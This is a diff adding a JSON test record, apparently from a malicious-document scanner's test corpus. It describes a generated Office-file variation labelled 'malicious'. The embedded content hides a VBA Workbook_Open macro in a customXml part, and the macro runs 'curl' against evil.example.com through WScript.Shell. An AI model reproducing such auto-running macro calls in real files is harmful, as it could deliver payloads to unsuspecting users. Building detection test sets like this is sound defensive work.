@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::8::binary-variations::4",
+  "base_sample_id": "exp::document-office::8",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -1794937884,
+  "content": "{\n  \"format\": \"office\",\n  \"customXml\": {\n    \"partName\": \"customXml/item1.xml\",\n    \"content\": \"<root><field name=\\\"custom\\\">Private Sub Workbook_Open()\\n  CreateObject(\\\"WScript.Shell\\\").Run \\\"curl http://evil.example.com/\\\"\\nEnd Sub\\n</field></root>\"\n  }\n}",
+  "content_hash": "215e2a3b69295f4c129ed9c9574979f6fad9e24bd4840b9de2d749da3689194e",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:office-custom-xml",
+  "difficulty": "advanced"
+}
